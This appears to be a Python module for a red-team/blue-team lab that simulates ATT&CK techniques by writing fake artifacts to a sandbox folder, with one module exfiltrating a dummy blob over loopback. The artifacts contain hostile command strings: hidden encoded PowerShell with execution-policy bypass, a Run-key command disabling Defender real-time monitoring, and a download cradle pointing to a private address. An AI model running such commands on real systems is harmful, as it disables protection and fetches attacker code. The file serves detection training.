"""Red team side: build simulated techniques against the lab sandbox.

Every module writes artifacts **only** inside ``outputs/lab_target`` and, for
the network technique, talks only to a loopback socket. Nothing here touches
config, registry, services or other hosts - it is a build/simulation lab.
"""

from __future__ import annotations

import shutil
from dataclasses import dataclass
from pathlib import Path
from typing import Callable

from . import mitre
from .util import (b64_ratio, b64encode_raw, entropy_ratio, now_iso, rand_bytes,
                   random_machine_name, random_token, sha256_hex, write_json)


@dataclass
class RedContext:
    lab_root: Path
    run_id: str
    ts: str

    def __post_init__(self) -> None:
        self.lab_root.mkdir(parents=True, exist_ok=True)
        self.ts = now_iso()

    def dir(self, rel: str) -> Path:
        d = self.lab_root / rel
        d.mkdir(parents=True, exist_ok=True)
        return d

    def write(self, rel: str, data: bytes) -> Path:
        p = self.lab_root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(data)
        return p

    def note(self, technique_id: str, file: str, event: str, category: str,
             extras: dict | None = None) -> dict:
        path = self.lab_root / file if file != "-" else None
        size = path.stat().st_size if path and path.exists() else 0
        digest = sha256_hex(path.read_bytes()) if path and path.exists() else ""
        tech = mitre.TECH_BY_ID.get(technique_id)
        return {
            "file": file,
            "ts": now_iso(),
            "run_id": self.run_id,
            "category": category,
            "technique_id": technique_id,
            "technique_name": tech.name if tech else technique_id,
            "event": event,
            "hash_sha256": digest,
            "size": size,
            "extras": extras or {},
        }


LURE_DOC = (
    b"PK\x03\x04  macro-enabled update document\r\n"
    b"Welcome to the quarterly payroll summary. To view macros, enable content.\r\n"
    b"[Auto_Open] Shell.Run 'powershell -enc <base64>'  'run', 0\r\n"
)


def _module_sched_task(ctx: RedContext) -> list[dict]:
    name = random_token(5)
    xml = (
        "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n"
        f"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
        f"  <Triggers><CalendarTrigger><StartBoundary>2026-10-01T09:00:00</StartBoundary>"
        f"<ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay></CalendarTrigger></Triggers>\n"
        f"  <Actions><Exec><Command>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Command>"
        f"<Arguments>-w hidden -enc {b64encode_raw(b'Start-Process powershell -ArgumentList `-ep bypass`')}</Arguments>"
        f"</Exec></Actions>\n"
        f"  <Principals><Principal id=\"Author\"><LogonType>InteractiveToken</LogonType></Principal></Principals>\n"
        f"  <Settings><Hidden>true</Hidden></Settings>\n"
        "</Task>\n"
    ).encode("utf-16-le", "surrogatepass")
    path = f"tasks\\{name}.xml"
    ctx.write(path, xml)
    ctx.write("tasks\\job_manifest.json", (
        b"{\"jobs\":[\"maintenance-update\",\"telemetry-collector\",\"" + name.encode() + b"\"]}"
    ))
    return [
        ctx.note("T1053.005", path, f"Scheduled task '{name}' registered (hidden, daily trigger) "
                                    "pointing at obfuscated PowerShell.",
                 "sched_task", {"task": name, "trigger": "daily", "hidden": True}),
        ctx.note("T1053.005", "tasks\\job_manifest.json",
                 "New job entry appended to task store manifest.", "sched_task",
                 {"added_job": name}),
    ]


def _module_phish_attach(ctx: RedContext) -> list[dict]:
    name = "Payroll_Q4_" + random_token(4)
    doc = name + ".docm"
    ctx.write("downloads\\" + doc, LURE_DOC)
    z = name + "_proof_of_payment.zip"
    ctx.write("downloads\\" + z, rand_bytes(1200) + b"crypted-package")
    return [
        ctx.note("T1566.001", "downloads\\" + doc,
                 f"Spearphishing lure '{doc}' (macro-enabled) landed in Downloads.",
                 "phishing", {"extension": ".docm", "macro": True}),
        ctx.note("T1566.001", "downloads\\" + z,
                 f"Archive lure '{z}' with packed executable landed in Downloads.",
                 "phishing", {"extension": ".zip", "contains": "exe"}),
    ]


def _module_run_key(ctx: RedContext) -> list[dict]:
    key = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    val = "UpdaterSvc"
    payload = b"powershell -ep bypass -w hidden -noexit -c \"Set-MpPreference -DisableRealtimeMonitoring\""
    lnk = "startup\\Update Helper.lnk"
    lnkdata = b"\x4c\x00\x00\x00" + b"fake-shortcut-v1" + payload + rand_bytes(96)
    ctx.write("registry\\run_key_export.reg", (
        b"Windows Registry Editor Version 5.00\r\n\r\n"
        b"[" + key.encode() + b"]\r\n\"UpdaterSvc\"=\"" + payload + b"\"\r\n"
    ))
    ctx.write(lnk, lnkdata)
    return [
        ctx.note("T1547.001", "registry\\run_key_export.reg",
                 f"Autostart value '{val}' added under {key}.", "autostart",
                 {"key": key, "value": val}),
        ctx.note("T1547.001", lnk,
                 "Startup-folder shortcut referencing a PowerShell payload created.",
                 "autostart", {"folder": "startup", "extension": ".lnk"}),
    ]


_OBFUS1 = b"poWeRsHeLl.eXe -eNc "
_OBFUS2 = b" -w hidden -noExit -exec bypass"
_PS_VAR = b"AQVAUQBvAGcAaQBuAADQPT0APQA9AA=="


def _module_powershell(ctx: RedContext) -> list[dict]:
    cmd = (
        b"$W=60; $R='T`rue'; function x($a){$a -split '' | ForEach-Object {"
        b"[char]([int][char]$_ + $W)} | Join-String} "
        b"(New-Object Net.WebClient).DownloadString('http://10.0.0.%s:8053/update')"
    ) % random_token(2).encode()
    enc = b64encode_raw(_PS_VAR + cmd)
    line = _OBFUS1 + enc.encode() + _OBFUS2
    ctx.write("powershell\\consolehost_history.log", line + b"\r\n")
    ctx.write("powershell\\4104_scriptblock.log", (
        b"ScriptBlockId: {" + random_token(24).encode() + b"}\r\nCommand: " + line + b"\r\n"
    ))
    ps = [
        ctx.note("T1059.001", "powershell\\4104_scriptblock.log",
                 "PowerShell launched with obfuscated switch style and encoded body.",
                 "powershell", {"ps_line": line.decode("latin-1")[:200], "redirect": "-enc"}),
        ctx.note("T1059.001", "powershell\\consolehost_history.log",
                 "PowerShell console session recorded usable but suspicious command line.",
                 "powershell", {"ps_line_true": True}),
        ctx.note("T1027", "powershell\\4104_scriptblock.log",
                 "Command obfuscated via Base64 body + character math wrapper.",
                 "powershell",
                 {"base64_body": True, "char_math": True, "entropy": entropy_ratio(_PS_VAR)}),
    ]
    return ps


def _module_sysinfo(ctx: RedContext) -> list[dict]:
    host = random_machine_name()
    out = (
        f"HostName: {host}\n"
        f"OS: Windows 10 Pro 22H2 (Build 19045)\n"
        f"IP: 10.0.0.{random_token(3)}{'1'}\n"
        f"Role: WORKSTATION\n"
        f"Users: alice, svc-sql, backup.daemon\n"
        f"PatchLevel: MSxx-2026-09\n"
    ).encode()
    path = "discovery\\" + host + "_hostinfo.txt"
    ctx.write(path, out)
    ctx.write("discovery\\sweep_results.csv", (
        b"host,os,role,open_ports\r\n"
        + host.encode() + b",win10,SERVER,445/5985/3389\r\n"
    ))
    return [
        ctx.note("T1082", path,
                 "Discovery sweep wrote a host-info report (OS, IP, users, patch level).",
                 "discovery", {"hostname": host, "fields": 5}),
        ctx.note("T1082", "discovery\\sweep_results.csv",
                 "Gathered network visibility data into a sweep worksheet.",
                 "discovery", {"rows": 1, "ports": "445/5985/3389"}),
    ]


_TOOL_DATA = (b"MZ\x90\x00" + b"\x00" * 60 + rand_bytes(9000))


def _module_tool_drop(ctx: RedContext) -> list[dict]:
    tool = "procdump_like_svc.exe"
    content = b"PK\x03\x04" + _TOOL_DATA
    path = "tools\\" + tool
    ctx.write(path, content)
    ctx.write("tools\\stage_dirs.txt", b"C:\\Users\\Public\\.cache\nD:\\shared\\tools\n")
    return [
        ctx.note("T1105", path,
                 f"Tool binary '{tool}' transferred into the labs tools store over C2.",
                 "tool_drop", {"tool": tool, "size": len(content), "proto": "http-c2"}),
        ctx.note("T1105", "tools\\stage_dirs.txt",
                 "Staging folder list written by the transfer routine.", "tool_drop"),
    ]


def _module_masquerade(ctx: RedContext) -> list[dict]:
    real = shutil.which("ping.exe") or shutil.which("find.exe")
    src = Path(real) if real else None
    data = src.read_bytes()[:12288] if src else _TOOL_DATA
    name = "System32\\svch0st.exe"
    fake = "ms-windows-store\\svchost.exe.copy"
    ctx.write(fake, data)
    ctx.write(name, data[:8192])
    return [
        ctx.note("T1036.005", fake,
                 "Dropped PE carried to a trusted-looking location under a typo-squelched name.",
                 "masquerade", {"renamed_from": "ping.exe", "spoof": "svchost.exe"}),
        ctx.note("T1036.005", name,
                 "PE masqueraded as 'System32\\svch0st.exe' to blend with system names.",
                 "masquerade", {"spoof": "svchost.exe", "location": "System32"}),
    ]


def _module_c2_exfil(ctx: RedContext) -> list[dict]:
    import socket
    secrets = ctx.dir("secrets")
    blob = b"flag{q4-client-database}\n" + rand_bytes(512)
    payload = b64encode_raw(blob).encode()
    bound = ("127.0.0.1", 0)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.bind(("127.0.0.1", 0))
        bound = srv.getsockname()
        srv.listen(1)
        with socket.create_connection(bound, timeout=3) as client:
            client.sendall(payload)
            with srv.accept()[0] as conn:
                received = conn.recv(65536)
    ctx.write("exfil\\sent_chunk.b64", payload)
    path = "exfil\\sent_chunk.b64"
    data = payload
    return [
        ctx.note("T1041", path,
                 f"Secrets blob exfiled over C2 channel (loopback:{bound[1]}), {len(data)} bytes.",
                 "exfil", {
                     "port": bound[1], "bytes": len(data),
                     "b64ratio": b64_ratio(data), "entropy": entropy_ratio(data),
                     "channel": "http-c2", "vaulted": secrets.name,
                 }),
    ]


def _module_native_api(ctx: RedContext) -> list[dict]:
    api_lines = (
        "NtCreateUserProcess  PID=1480 PARENT=1856 Image=cmd.exe CmdLine='/c rundll_136 %TEMP%\\svc.dat'\n"
        "VirtualAllocEx      PID=1480 Size=0x1234 Protect=RWX\n"
        "WriteProcessMemory  PID=1480 Dst=0x7FF88A00\n"
        "CreateThread        PID=1480 StartRoutine=0x7FF88A00\n"
    )
    ctx.write("api\\api_call_trace.log", api_lines.encode())
    return [
        ctx.note("T1106", "api\\api_call_trace.log",
                 "Process/API call trace shows create-allocate-write-execute chain on a child "
                 "process - classic API-level execution.",
                 "api", {"api_chain": "CreateProcess->VAlloc->WriteMem->CreateThread"}),
    ]


ModuleFn = Callable[[RedContext], list[dict]]

MODULES: dict[str, tuple[ModuleFn, tuple[str, ...]]] = {
    "sched_task": (_module_sched_task, ("T1053.005",)),
    "phish_attach": (_module_phish_attach, ("T1566.001",)),
    "run_key": (_module_run_key, ("T1547.001",)),
    "powershell": (_module_powershell, ("T1059.001", "T1027")),
    "sysinfo": (_module_sysinfo, ("T1082",)),
    "tool_drop": (_module_tool_drop, ("T1105",)),
    "masquerade": (_module_masquerade, ("T1036.005",)),
    "c2_exfil": (_module_c2_exfil, ("T1041",)),
    "native_api": (_module_native_api, ("T1106",)),
}


def module_for_technique(tid: str) -> str | None:
    for mod, (_, techs) in MODULES.items():
        if tid in techs:
            return mod
    return None


def run_techniques(lab_root: Path, run_id: str, technique_ids: list[str]) -> tuple[list[dict], list[str]]:
    """Execute the selected techniques. Returns (artifacts, executed_technique_ids).

    Modules are de-duplicated (one module can serve several techniques, e.g.
    PowerShell serves both T1059.001 and T1027). ``executed`` lists *every
    selected technique* whose artifacts were laid - including companions served
    by a shared module.
    """
    ctx = RedContext(lab_root=lab_root, run_id=run_id, ts=now_iso())
    artifacts: list[dict] = []
    used: list[str] = []
    for tid in technique_ids:
        mod = module_for_technique(tid)
        if mod is None or mod in used:
            continue
        used.append(mod)
        fn, techs = MODULES[mod]
        artifacts.extend(fn(ctx))
    laid_ids = {a.get("technique_id") for a in artifacts}
    executed = [t for t in technique_ids if t in laid_ids]
    return artifacts, executed


def reset_lab(lab_root: Path) -> None:
    """Build a clean lab baseline (so the blue side has a realistic, non-empty target)."""
    import shutil
    if lab_root.exists():
        shutil.rmtree(lab_root, ignore_errors=True)
    ctx = RedContext(lab_root=lab_root, run_id="baseline", ts=now_iso())
    ctx.dir("secrets")
    ctx.dir("powershell")
    ctx.write("secrets\\secrets.txt", (
        b"client-db-url = sql://internal-crm/payroll\n"
        b"backup-vault-key = AES-256 rotate-daily\n"
    ))
    ctx.write("baseline_manifest.txt",
              b"Lab baseline built - red techniques will be detectable from clean state.\n")